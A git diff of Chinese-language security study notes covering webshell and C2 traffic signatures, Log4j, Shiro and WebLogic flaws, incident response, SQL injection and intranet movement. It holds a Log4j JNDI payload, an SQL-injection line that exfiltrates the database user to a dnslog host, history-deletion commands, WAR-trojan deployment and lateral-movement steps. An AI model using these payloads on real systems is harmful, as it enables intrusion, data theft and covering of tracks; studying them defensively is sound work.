@@ -29,12 +29,13 @@
   + 数据变量常为z0,z1,z2
 + 蚁剑
 
-  + 请求体固定@ini_set(“display_errors”, “0”);@set_time_limit(0)
+  + 请求体固定@ini_set("display_errors", "0");@set_time_limit(0)
   + 常用base64
 + 冰蝎
 
   + 2.0
     + 请求返回一个16位的key
+    + accept q=.2
   + 3.0
     + 使用二进制协议
     + content-type一定为application/octet-stream
@@ -55,15 +56,6 @@
 + MSF
 
   + 4444
-+ **weblogic**
-
-  + 7001
-+ **shrio**
-
-  + 分为550和721，550是反序列化，721是加密解密，550不需要rememberMe Cookie解密，721需要来remenberMe Cookie解密；
-+ fastjson
-
-  + @type,rmi,ladp等字符
 + CS
 
   + http特征，get请求对url请求资源文件，取决于c2的profile的设置，请求头一般用base64加密后的
@@ -82,7 +74,7 @@
   + IOX
 + reGeorg
 
-  + 通过整个http隧道的建立过程的流量分析，可以看到起初是通过tunnel.jsp，connect内网指定ip的指定端口，然后read读取，通告其内容编码为identity，采用分块传输，最后disconnect关闭连接
+  + tunnel.jsp
 
 ## 日志分析
 
@@ -103,11 +95,6 @@
   + 192.168.0.0/16
 + 回路
   + 127.0.0.0/8
-
-额外知识
-
-+ CDN提供多个节点，缓存分发数据，达到负载均衡，攻击者的域名挂靠CDN使得真实IP地址难以溯源
-  + 溯源：联系CDN厂商，查看域名历史解析IP，同站资源，SSL证书
 
 ## 经历
 
@@ -143,6 +130,7 @@
   + 反序列化，war后门
 + WebLogic
 
+  + 7001
   + 反序列化，SSRF，任意文件上传，war后门
   + https://xz.aliyun.com/t/12452
   + T3协议多工双向
@@ -178,7 +166,12 @@
   + payload:${jndi:ldap://127.0.0.1/exploit}
   + 解析发现是JNDI的扩展内容再进一步解析发现是LDAP协议的服务器查找key是exploit，当exploit是java恶意对象就可以造成RCE
 + springboot
-+ 
++ **shrio**
+
+  + 分为550和721，550是反序列化，721是加密解密，550不需要rememberMe Cookie解密，721需要来remenberMe Cookie解密；
++ fastjson
+
+  + @type,rmi,ladp等字符
 
 ## 挖矿
 
@@ -241,6 +234,9 @@
 ## 溯源
 
 + 捕获 处置 画像
++ 其他
+
+  + 使用空间测绘引擎搜索相邻网段指定端口的指纹是否和情报域名相同
 + 捕获
 
   + 钓鱼邮件
@@ -270,13 +266,13 @@
   + 收到一个ip
   + 查询ip归属地为 马来西亚
   + 使用nmap简单探测，第二次发现被封ip
-  + 使用在线的端口探测工具扫描得到22 3306
+  + 使用在线的端口探测工具扫描得到80 22 3306
   + 使用代理上AWVS扫描成功得到一个php的RCE漏洞
   + 验证后反弹shell，先执行set +o history 关闭历史记录 后使用history -d id 删除刚刚的记录
   + last查看最近登陆信息 都为本机ip，uname -a 查看内核版本 查看是否有提权漏洞 放弃
   + netstat -ano 导出ip 发现有一个中国阿里云节点ip，还有一个俄罗斯ip
   + top 查看占用CPU的进程 发现一个kdevtmpfsi进程，搜索后发现是个挖矿木马 占用大 并使用systemctl status pid 查看进程 发现有守护进程 kill -9 结束掉 find / -name 通配符匹配木马名字 rm -rf 删除
-  + 再次netstat -ano 发现俄罗斯ip已经不见了，应该是挖矿池的key
+  + 再次netstat -ano 发现俄罗斯ip已经不见了，应该是挖矿池的ip
   + 在线端口扫描阿里云服务器 查到80端口，考虑dirsearch一下 无果
   + 深入查找端口 nmap全端口探测一下，发现8088 tomcat服务，并且使用弱口令成功进入使用 jar cvf test.war test.jsp 部署war包木马 成功反弹shell
   + last 查看最近登陆信息 有香港 台湾 马来西亚的
@@ -319,3 +315,35 @@
   + docker提权
   + ssh密钥提权
   + 内核提权uname -a再 searchsploit
+
+## sql
+
++ dns外带
+  + 限制于
+    + win
+    + UNC路径
+    + secure_file_priv为null
+  + 步骤
+    + show variables like '%secu%';查看变量是否为null
+    + my.ini可修改
+    + ?id=1' and load_file(concat('\\\\',hex(user()),'.ui9a1m.dnslog.cn/abc'))--+
+      + 可得到用户名的HEX 从dnslog中
++ 写shell
+  + 需求
+    + outfile和dumpfile
+    + 权限
+  + sqlmap --os-shell
+  + 绝对路径
+
+## SSRF
+
+## 内网
+
++ 流程
+  + 代理进跳板后fscan扫描存活主机，net user /domain看此时是否在域内，提权，提取凭证，横向移动，痕迹清除
+  + nmap扫描内网 用漏扫插件扫cve和ms相关的漏洞，扫描到内网端口有3389,3306,80就对其爆破目录扫描
++ 命令执行
+  + psexec wmic smbexec winrm
++ 不出网怎么办
+  + webshell搭配reGeorg实现socks代理
+  +
